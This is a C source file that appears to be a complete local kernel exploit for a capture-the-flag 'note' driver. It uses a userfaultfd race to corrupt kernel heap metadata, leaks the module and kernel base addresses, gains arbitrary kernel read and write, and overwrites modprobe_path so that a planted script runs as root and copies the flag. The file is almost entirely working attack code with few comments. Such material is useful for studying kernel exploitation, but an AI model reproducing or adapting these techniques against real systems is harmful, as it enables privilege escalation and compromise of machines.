// gcc -static -pthread exp.c -g -o exp
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <stdint.h>

typedef struct noteRequest{
    size_t idx;
    size_t length;
    char* buf;
}NoteReq;

int fd;
char buffer[0x1000] = { 0 };
size_t fault_ptr;
void init(){
    fd = open("/dev/note", 0);
    if (fd < 0){
        printf("open fd error\n");
        exit(-1);
    }
    puts("Open device ok\n");
}

void New(char*buf, uint8_t length){
    NoteReq req;
    req.length = length;
    req.buf = buf;
    if(-1 == ioctl(fd, -256, &req)){
        puts("New error\n");
        exit(-1);
    }
}

void Edit(uint8_t idx, char* buf, uint8_t len){
    NoteReq req;
    req.idx = idx;
    req.length = len;
    req.buf = buf;
    if(-1 == ioctl(fd, -255, &req)){
        puts("Edit err\n");
        exit(-1);
    }
}

void Show(uint8_t idx, char* buf){
    NoteReq req;
    req.idx = idx;
    req.buf = buf;
    if(-1 == ioctl(fd, -254, &req)){
        puts("Show err\n");
        exit(-1);
    }
}

void Delete(){
    NoteReq req;
    if(-1 == ioctl(fd, -253, &req)){
        puts("Delete err\n");
        exit(-1);
    }
}

void* handler(void *arg){
    struct uffd_msg msg;
    unsigned long uffd = (unsigned long)arg;
    puts("[+] Handler created");

    struct pollfd pollfd;
    int nready;
    pollfd.fd     = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);
    if (nready != 1)  // 这会一直等待，直到copy_from_user访问FAULT_PAGE
        {
        puts("wrong pool return\n");
        exit(-1);
    }   
    printf("[+] Begin handler\n");

    //here, we can write our own code
    Delete();
    New(buffer, 0);     //note[0]
    New(buffer, 0);     //note[1]

    buffer[8]=0xff; //change note[1].length

    if (read(uffd, &msg, sizeof(msg)) != sizeof(msg)) // 偶从uffd读取msg结构，虽然没用
    {
        puts("uffd read err\n");
        exit(-1);
    }    

    struct uffdio_copy uc;
    memset(buffer, 0, sizeof(buffer));
    buffer[8] = 0xf0; //把note1 的length改成0xf0

    uc.src = (unsigned long)buffer;
    uc.dst = (unsigned long)fault_ptr;
    uc.len = 0x1000;
    uc.mode = 0;
    ioctl(uffd, UFFDIO_COPY, &uc);  // 恢复执行copy_from_user

    puts("[+] handle finished");
    return NULL;    
   
}

size_t register_userfault(){
   long uffd;        
   char *addr;       
   size_t len = 0x1000;
   pthread_t thr; 
   struct uffdio_api uffdio_api;
   struct uffdio_register uffdio_register;
   int s;
   uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
   if (uffd == -1)
   {
       puts("userfaultfd\n");
       exit(-1);
   }


   uffdio_api.api = UFFD_API;
   uffdio_api.features = 0;
   if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)      // create the user fault fd
   {
       puts("ioctl uffd err\n");
       exit(-1);
   }
   addr = mmap(NULL, len, PROT_READ | PROT_WRITE,       //create page used for user fault
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
   if (addr == MAP_FAILED)
   {
       puts("map err\n");
       exit(-1);
   }

   printf("Address returned by mmap() = %p\n", addr);
   uffdio_register.range.start = (size_t) addr;
   uffdio_register.range.len = len;
   uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
   if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)//注册页地址与错误处理fd，这样只要copy_from_user
//                                       //访问到FAULT_PAGE，则访问被挂起，uffd会接收到信号
   {
       puts("ioctl register err\n");
       exit(-1);
   }

   s = pthread_create(&thr, NULL, handler, (void *) uffd); //handler函数进行访存错误处理
   if (s != 0) {
       errno = s;
        puts("pthread create err\n");
       exit(-1);
   }
   return addr;
}

int main()
{
    system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/note/flag\n/bin/chmod 777 /home/note/flag' > /home/note/getflag.sh");
    system("chmod +x /home/note/getflag.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/note/ll");
    system("chmod +x /home/note/ll");
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    init();
    New(buffer, 0x10);

    fault_ptr = register_userfault();
    Edit(0, fault_ptr, 0x10);

    Show(1, buffer);
    size_t key = *(size_t*)buffer;
    printf("key is 0x%lx\n",key);

    New(buffer, 0x0);   //note[2]
    Show(1, buffer);

    //leak module_base_off
    size_t note2ContPtr = *(size_t*)(buffer+0x10)^key;
    size_t module_base_off = note2ContPtr - 0x2568;
    printf("note2ContPtr: 0x%lx \nmodule_base_off: 0x%lx\n",note2ContPtr, module_base_off);

    unsigned long* fake_note = (unsigned long*)buffer;
    fake_note[0] = key^0;
    fake_note[1] = 4^key;
    fake_note[2] = (module_base_off+0x1fa)^key;
    
    Edit(1, fake_note, 0x18);
    //leak page_offset_base_offset
    int page_offset_base_offset = 0;
    Show(2, (char*)&page_offset_base_offset);
    printf("page_offset_base_offset: %x\n", page_offset_base_offset);

    size_t page_offset_base_addr = page_offset_base_offset + module_base_off + 0x1fe;
    printf("page_offset_base_addr: 0x%lx\n", page_offset_base_addr);

    //leak page_offset_base
    fake_note[0] = key^0;
    fake_note[1] = 0x8^key;
    fake_note[2] = page_offset_base_addr^key;
    Edit(1, fake_note, 0x18);
    size_t page_offset_base = 0;
    Show(2, (char*)&page_offset_base);
    printf("page_offset_base: 0x%lx\n", page_offset_base);

    size_t module_base = module_base_off + page_offset_base;
    printf("module_base: 0x%lx\n", module_base);
    
    //leak module_base
    fake_note[0] = key^0;
    fake_note[1] = 0x4^key;
    fake_note[2] = (module_base_off+0x6d)^key;
    Edit(1, fake_note, 0x18);
    int copy_from_user_off = 0;
    Show(2, (char*)&copy_from_user_off);
    printf("copy_from_user_off: 0x%x\n", copy_from_user_off);

    size_t copy_from_user_addr = copy_from_user_off+0x71+module_base;
    size_t kernel_base = copy_from_user_addr - (0xae553e80-0xae200000);
    printf("copy_from_user_addr: 0x%lx\n kernel_base: 0x%lx\n",copy_from_user_addr, kernel_base);

    size_t modprobe_path = kernel_base + (0xb1c5e0e0 - 0xb0c00000);
    printf("modprobe_path: 0x%lx\n", modprobe_path);

    char* buf = malloc(0x50);
    memset(buf, '\x00', 0x50);
    strcpy(buf, "/home/note/getflag.sh\0");
    //change modprobe_path
    fake_note[0] = key^0;
    fake_note[1] = 0x50^key;
    fake_note[2] = (modprobe_path-page_offset_base)^key;
    Edit(1, fake_note, 0x18);

    Edit(2, buf, 0x50);
    system("/home/note/ll");
    system("cat /home/note/flag");
    return 0;
}